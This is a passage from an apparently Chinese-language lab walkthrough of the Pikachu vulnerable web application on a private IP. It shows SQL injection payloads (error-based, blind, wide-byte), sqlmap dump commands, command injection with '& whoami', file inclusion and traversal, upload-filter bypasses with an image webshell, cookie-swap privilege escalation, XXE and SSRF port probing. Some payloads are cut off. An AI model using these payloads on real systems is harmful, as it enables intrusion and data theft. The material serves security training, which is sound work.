src="https://img-blog.csdnimg.cn/242234da62fd4440877fa18e4b499d56.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>加单引号报错说明存在注入</p><p><img src="https://img-blog.csdnimg.cn/a4a75375988a46328c494c481d1041d4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>id&#x3D;62+and+UpdateXML(1,concat(0x7e,payload),0)</p><p>id&#x3D;62+and+UpdateXML(1,concat(0x7e,database()),0)</p><p><img src="https://img-blog.csdnimg.cn/c926d12cc83c4d68bd09fbc166eb87c7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>之后的步骤和之前的注入一样</p><h2 id="http-header-注入"><a href="#http-header-注入" class="headerlink" title="http header 注入"></a>http header 注入</h2><p><img src="https://img-blog.csdnimg.cn/65102d5a91c04756a669ae1da842170e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_12,color_FFFFFF,t_70,g_se,x_16"></p><p>登录查看回显</p><p><img src="https://img-blog.csdnimg.cn/6835a1e183004de6a0f2c7d9bb8a81c4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>抓包查看</p><p><img src="https://img-blog.csdnimg.cn/b63ae6e979014bc5ab7f8d2368eff0c7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>在 user-agent 后加单引号，报错说明存在注入</p><p><img src="https://img-blog.csdnimg.cn/8b1008cd89e847728a10256d6e2b77fe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>‘and UpdateXML(1,concat(0x7e,payload),0) and’</p><p>‘and UpdateXML(1,concat(0x7e,database()),0) and’</p><p><img src="https://img-blog.csdnimg.cn/e3a77e8ebf65422e88710f55501f5245.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="盲注（base-on-boolian"><a href="#盲注（base-on-boolian" class="headerlink" title="盲注（base on boolian)"></a>盲注（base on boolian)</h2><p><img src="https://img-blog.csdnimg.cn/bcf5c355ced248659dddde1b87429759.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>加单引号查询报错，说明存在注入</p><p><img src="https://img-blog.csdnimg.cn/c3d03fd4aa784e65b4edcaf9bc4c9aec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>查询字段数为 2</p><p><img src="https://img-blog.csdnimg.cn/3d15f138cda94783a9d0fc53dfb7a770.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>这里盲注靶场做的不严谨，和之前有会显的注入用的是一个页面，有回显</p><p>我们假设这里不能够回显，进行盲注</p><p><img src="https://img-blog.csdnimg.cn/f7f07f6b8c91486e8cfb9b2c55c395bd.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>name&#x3D;vince’ and length(database())&#x3D;7 –+</p><p><img src="https://img-blog.csdnimg.cn/e0c149bc34d64ca9885c77121bc10067.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>name&#x3D;vince’ and ascii(substr(database(),1,1))&#x3D;112 –+</p><p><img src="https://img-blog.csdnimg.cn/6aaa86cc69a946f7a529f79a6a4a189e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>证明存在布尔盲注</p><p>接下来上工具爆破，sqlmap、burpsuite 都可以，也可以是自己写的工具</p><p>我这里用 sqlmap</p><p>python sqlmap.py -u “http://192.168.48.131/pikachu/vul/sqli/sqli_blind_b.php?submit&#x3D;%E6%9F%A5%E8%AF%A2&amp; –dbms&#x3D;mysql –batch –level&#x3D;5</p><p><img src="https://img-blog.csdnimg.cn/0d2666dd720d4d5699d2cf0899adf516.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>–tables 爆表名</p><p>–columns 爆列名</p><p>–dump 爆数据</p><h2 id="盲注（base-on-time）"><a href="#盲注（base-on-time）" class="headerlink" title="盲注（base on time）"></a>盲注（base on time）</h2><p>先测试是否存在时间盲注</p><p>name&#x3D;vince’ and sleep(5) –+</p><p>出现长时间延迟说明存在时间盲注</p><p><img src="https://img-blog.csdnimg.cn/35e5186008734873b56771757bfc7c13.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p>存在时间盲注</p><p>name&#x3D;vince’ and if(length(database())&#x3D;7,sleep(5),1) –+</p><p>name&#x3D;vince’ and if(ascii(substr(database(),1,1))&#x3D;112,sleep(5),1) –+</p><p>正确则发生延迟，错误则不延迟</p><p>接下来用工具 sqlmap，和之前布尔盲注的用法一样，这里就不展示了</p><h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p><img src="https://img-blog.csdnimg.cn/119004902d734a22bc05c495cfbbcd79.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>进行抓包</p><p><img src="https://img-blog.csdnimg.cn/4450148b1f8944bc85c78cec9ce0d51d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>发送到 repeater 模块</p><p><img src="https://img-blog.csdnimg.cn/85e160d933174f9397fd790c557da403.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>name&#x3D;vince %df’ union select 1,2 –+</p><p>存在宽字节注入</p><p><img src="https://img-blog.csdnimg.cn/e405f9bd248749c58be3cb18a35058e4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>接下来的步骤和之前一样</p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="exec”ping”"><a href="#exec”ping”" class="headerlink" title="exec”ping”"></a>exec”ping”</h2><p>我们可以尝试通过 &amp;、&amp;&amp;、|、||、; 等符号拼接执行的命令</p><p>利用 &amp; 同时执行其它命令</p><p>www.baidu.com & whoami</p><p><img src="https://img-blog.csdnimg.cn/d5db506e278c47c78bb488e83eca26cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_17,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="exec”eval”"><a href="#exec”eval”" class="headerlink" title="exec”eval”"></a>exec”eval”</h2><p>后台使用了 eval，并且没有做过滤，可以执行任意命令</p><p>phpinfo();</p><p><img src="https://img-blog.csdnimg.cn/a2914dfc6ea64027914a09a88652a48a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h1><h2 id="File-Inclusion-local"><a href="#File-Inclusion-local" class="headerlink" title="File Inclusion(local)"></a>File Inclusion(local)</h2><p><img src="https://img-blog.csdnimg.cn/64434c2572e042a2a42cc50388c14924.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>http://192.168.48.131/pikachu/vul/fileinclude/fi_local.php?filename&#x3D;file1.php&amp;submit&#x3D;%E6%8F%90%E4%BA%A4%E6%9F%A5%E8%AF%A2</p><p>看到包含引用的文件名在 url 中直接传值</p><p>试着把文件名换成一些其它本地文件</p><p>?filename&#x3D;..&#x2F;..&#x2F;..&#x2F;index.php</p><p><img src="https://img-blog.csdnimg.cn/6e91ef7779ed496eb4a60aaca46e2b76.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h2 id="File-Inclusion-remote"><a href="#File-Inclusion-remote" class="headerlink" title="File Inclusion(remote)"></a>File Inclusion(remote)</h2><p><img src="https://img-blog.csdnimg.cn/3626535a84914479a456ff1e0bffd7da.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>提示远程包含没有开启，修改 php.ini 开启</p><p><img src="https://img-blog.csdnimg.cn/d025750fb4fe4317a390a94c5964d1eb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>将 off 改为 On，然后重启服务</p><p><img src="https://img-blog.csdnimg.cn/64df91c344eb4a6f94e9ee71ec4e25f1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_12,color_FFFFFF,t_70,g_se,x_16"></p><p>将包含参数改为远程文件</p><p>?filename&#x3D;http://192.168.48.131/pikachu/index.php</p><p><img src="https://img-blog.csdnimg.cn/973f6c78359344d4954b6b6cab55f165.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>实战中可以直接包含远程木马文件</p><h1 id="Unsafe-Filedownload"><a href="#Unsafe-Filedownload" class="headerlink" title="Unsafe Filedownload"></a>Unsafe Filedownload</h1><p><img src="https://img-blog.csdnimg.cn/9b73f3068ee64fdd9e43b583cc939c11.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>进行抓包</p><p><img src="https://img-blog.csdnimg.cn/5d7a0fbd06ea483c8e5914019d411514.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>将文件名改为其它文件试试</p><p><img src="https://img-blog.csdnimg.cn/8390284e867d434db962f2161c8b2da0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_18,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/d837666dcddc41ffb11f59779dc941b6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_18,color_FFFFFF,t_70,g_se,x_16"></p><p>下载成功</p><h1 id="Unsafe-Fileupload"><a href="#Unsafe-Fileupload" class="headerlink" title="Unsafe Fileupload"></a>Unsafe Fileupload</h1><h2 id="client-check"><a href="#client-check" class="headerlink" title="client check"></a>client check</h2><p>先上传正常图片文件</p><p><img src="https://img-blog.csdnimg.cn/c8903807f4084f13a21f735ae2f84900.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/d42c0aba63944b8e9616f3121891d7cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_13,color_FFFFFF,t_70,g_se,x_16"></p><p>上传成功</p><p>接下来试试上传可执行文件</p><p><img src="https://img-blog.csdnimg.cn/59447e954c204236a2e9d6b202cd636d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_18,color_FFFFFF,t_70,g_se,x_16"></p><p>发现有弹窗，证明存在前端验证</p><p>抓包绕过前端验证</p><p>将可执行文件后缀名改为 jpg</p><p><img src="https://img-blog.csdnimg.cn/a578cdcb9b684048aab8b2f6a1abb8e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_17,color_FFFFFF,t_70,g_se,x_16"></p><p>上传时抓包再改回可执行文件</p><p><img src="https://img-blog.csdnimg.cn/b63c48fdc85c4410b3a2fc4bb316481a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p>上传成功</p><h2 id="MIME-type"><a href="#MIME-type" class="headerlink" title="MIME type"></a>MIME type</h2><p>抓包将 Content-Type 改为允许的图片类型</p><p><img src="https://img-blog.csdnimg.cn/96cc9b2efc0842daaa3c6520156c2bfe.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_16,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/fc6addc26eae45759780226f38a05aba.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p>上传成功</p><h2 id="getimagesize"><a href="#getimagesize" class="headerlink" title="getimagesize"></a>getimagesize</h2><p>上传可执行文件，将 content-type 改为图片</p><p><img src="https://img-blog.csdnimg.cn/2c45f9389c6d48189ece7addc19e96dc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_13,color_FFFFFF,t_70,g_se,x_16"></p><p>显示后缀名为空，说明服务器将不为规定的三种图片后缀的后缀名都过滤删除了</p><p>将后缀名改为 jpeg</p><p><img src="https://img-blog.csdnimg.cn/9a3aba8288f3411aaf400832419a77d9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>显示上传的是假图片，说明对文件内容进行了检测</p><p>在文件中加上图片文件头</p><p><img src="https://img-blog.csdnimg.cn/29cfccd907d040509ea4409ab3c952e5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_17,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/f6ea95565a8742f8bc16396db47ae805.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>发现还是被检测出来，说明不光对文件内容头进行了检测</p><p>上传图片马试试</p><p><img src="https://img-blog.csdnimg.cn/81709dd1eb034b6f9bf2581f7015f6b0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_14,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/1f10350068cf409e85d7d0bac5f4db93.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_17,color_FFFFFF,t_70,g_se,x_16"></p><p>上传成功</p><h1 id="Over-Permission"><a href="#Over-Permission" class="headerlink" title="Over Permission"></a>Over Permission</h1><h2 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h2><p><img src="https://img-blog.csdnimg.cn/51af85df2ed642e79c47054f5e54c5c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>先用一个普通用户登录试试</p><p><img src="https://img-blog.csdnimg.cn/3d39ac4dc95e45e68e5198f41650c9d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p>查看个人信息</p><p><img src="https://img-blog.csdnimg.cn/5f8bd8b9dbe04cd6ba086b8005c0f2e2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_17,color_FFFFFF,t_70,g_se,x_16"></p><p>抓包</p><p><img src="https://img-blog.csdnimg.cn/b47df53cce864d84afa7785dcdf739cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>将用户名改为其它用户的用户名试试</p><p><img src="https://img-blog.csdnimg.cn/d0798b8ea6a64ae2a5b8608fd61ca94a.png"></p><p><img src="https://img-blog.csdnimg.cn/e9d03d401a834a3a96693e8e23adee4f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_16,color_FFFFFF,t_70,g_se,x_16"></p><p>可以查看别人的信息</p><h2 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h2><p><img src="https://img-blog.csdnimg.cn/22c0df256646499bbbee9321cfd449b4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_13,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/7fa3819566cf4779b77d47e7477b0c62.png"></p><p>用 pikachu 登录</p><p><img src="https://img-blog.csdnimg.cn/b7099f7eaa7a4616aadc4ef142c1b57c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>添加用户，抓包，发送到 repeater 模块</p><p>然后将刚才的抓到的包放出去</p><p><img src="https://img-blog.csdnimg.cn/50213c95c68e4da3903f068bd79ca76b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>添加用户成功</p><p>接下来退出登录</p><p><img src="https://img-blog.csdnimg.cn/0e98f350df674715856f4e9798e7b3f3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_10,color_FFFFFF,t_70,g_se,x_16"></p><p>repeater 再次发送添加用户的数据包</p><p><img src="https://img-blog.csdnimg.cn/ff8ab3ef9211422b9146813bb56a36cc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>添加用户失败，因为需要登录</p><p>用普通用户 pikachu 登录</p><p><img src="https://img-blog.csdnimg.cn/a9f476da83e644fab513f63fdbfde155.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>将 cookie 换成普通用户的，再次 repeater 发送添加用户数据包</p><p><img src="https://img-blog.csdnimg.cn/de6da425dbbb4b41933868a6dc04dddb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_8,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/25feb1775f684500b76ddaa866e053c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/3f86c657971f4e4f8fc7913a9c3ad3de.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/c18c6aa32e694890af8cd914ce8d18ac.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>用户创建成功</p><h1 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h1><p>http://192.168.48.131/pikachu/vul/dir/dir_list.php?title&#x3D;jarheads.php</p><p><img src="https://img-blog.csdnimg.cn/e0a6308d81d641bf9e44c01c76515c1b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>http://192.168.48.131/pikachu/vul/dir/dir_list.php?title&#x3D;truman.php</p><p><img src="https://img-blog.csdnimg.cn/d0ea006c24e54689ae2852be6ea89eb3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_18,color_FFFFFF,t_70,g_se,x_16"></p><p>将 title 改为通过..&#x2F; 改为其它目录下文件，发现可以读出文件</p><p>http://192.168.48.131/pikachu/vul/dir/dir_list.php?title&#x3D;..&#x2F;..&#x2F;..&#x2F;README.md</p><p><img src="https://img-blog.csdnimg.cn/17b7d636d6fb43cebbfcc17f695c49c9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h1><p>打开网页查看源代码发现有测试账号泄露</p><p><img src="https://img-blog.csdnimg.cn/ea911507403d42af9670d3ab2f9b224f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_12,color_FFFFFF,t_70,g_se,x_16"></p><p><img src="https://img-blog.csdnimg.cn/477442abcf3d42ad9eabf0baf344e788.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP 反序列化"></a>PHP 反序列化</h1><p><img src="https://img-blog.csdnimg.cn/1f7dac6498f24ec19dd067e7d62ec900.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_15,color_FFFFFF,t_70,g_se,x_16"></p><p>构造 php 序列化 payload</p><p>O:1:”S”:1:{s:4:”test”;s:29:””;}</p><p><img src="https://img-blog.csdnimg.cn/abf9909208df4e28bc744f2a6a779431.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_18,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p><img src="https://img-blog.csdnimg.cn/788a3b5c1d50490b931764c1cc327f97.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_9,color_FFFFFF,t_70,g_se,x_16"></p><p>构造 xxe payload</p><p>]&gt;</p><p>&amp;xxe;</p><p><img src="https://img-blog.csdnimg.cn/f9204c847d9b48a69d9ad424429178f9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_14,color_FFFFFF,t_70,g_se,x_16"></p><h1 id="URL-重定向"><a href="#URL-重定向" class="headerlink" title="URL 重定向"></a>URL 重定向</h1><p><img src="https://img-blog.csdnimg.cn/b6bbfae699194a3ab510243154fac36f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_11,color_FFFFFF,t_70,g_se,x_16"></p><p>第一个链接和第二个链接都是和当前页面一样</p><p>第三个链接是概述</p><p><img src="https://img-blog.csdnimg.cn/3040cb06af9c4c1bbcf03b6a65b1dda8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>第四个链接</p><p>http://192.168.48.131/pikachu/vul/urlredirect/urlredirect.php?url=i</p><p><img src="https://img-blog.csdnimg.cn/a697d11a293e442b8979c66bc04654d3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_12,color_FFFFFF,t_70,g_se,x_16"></p><p>试着将 url 改成其它链接试试</p><p>192.168.48.131&#x2F;pikachu&#x2F;vul&#x2F;urlredirect&#x2F;urlredirect.php?url&#x3D;https://www.baidu.com/</p><p>跳转到百度</p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="SSRF-curl"><a href="#SSRF-curl" class="headerlink" title="SSRF(curl)"></a>SSRF(curl)</h2><p><img src="https://img-blog.csdnimg.cn/67826c74104f427ea4d56d083becfa11.png"></p><p>点击链接</p><p><img src="https://img-blog.csdnimg.cn/d6f7a736f8084d0cb66f5fa1f76c7f3a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5aWL5paX5ZCn77yB5bCP6IOW5a2Q,size_8,color_FFFFFF,t_70,g_se,x_16"></p><p>http://192.168.48.131/pikachu/vul/ssrf/ssrf_curl.php?url&#x3D;http://127.0.0.1/pikachu/vul/ssrf/ssrf_info&#x2F;info1.php</p><p>试着把 url 请求的文件链接改为其它</p><p>探测端口开放</p><p>http://192.168.48.131/pikachu/vul/ssrf/ssrf_curl.php?url&#x3D;http://127.0.0.1:3306</p><p><img src="https://img-blog.csdnimg.cn/e0616e019b7149d19798d05b6ef901cc.png"></p><h2 